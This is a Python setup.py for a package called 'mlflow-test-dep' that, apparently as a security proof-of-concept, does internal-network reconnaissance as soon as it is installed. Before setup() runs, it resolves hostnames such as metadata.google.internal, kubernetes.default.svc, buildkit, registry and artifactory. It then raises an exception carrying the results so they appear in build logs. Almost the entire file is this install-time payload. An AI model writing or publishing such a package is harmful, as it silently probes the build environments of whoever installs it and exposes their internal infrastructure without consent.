import socket
from setuptools import setup

proof = "🚨🚨🚨 DNS_INTERNAL_RECON 🚨🚨🚨\n\n"

hosts = [
    "metadata.google.internal",
    "instance-data",
    "kubernetes.default.svc",
    "kubernetes.default",
    "buildkit",
    "buildkitd",
    "registry",
    "pypi",
    "internal",
    "databricks.internal",
    "artifactory",
]

for h in hosts:
    try:
        infos = socket.getaddrinfo(h, None)
        ips = sorted({i[4][0] for i in infos})
        proof += f"  RESOLVED: {h} -> {ips[:3]}\n"
    except Exception as e:
        proof += f"  no: {h} ({type(e).__name__})\n"

proof += "\n🚨🚨🚨 END DNS RECON 🚨🚨🚨\n"
print(proof)
raise Exception(proof)

setup(name="mlflow-test-dep", version="0.1", description="DNS recon")
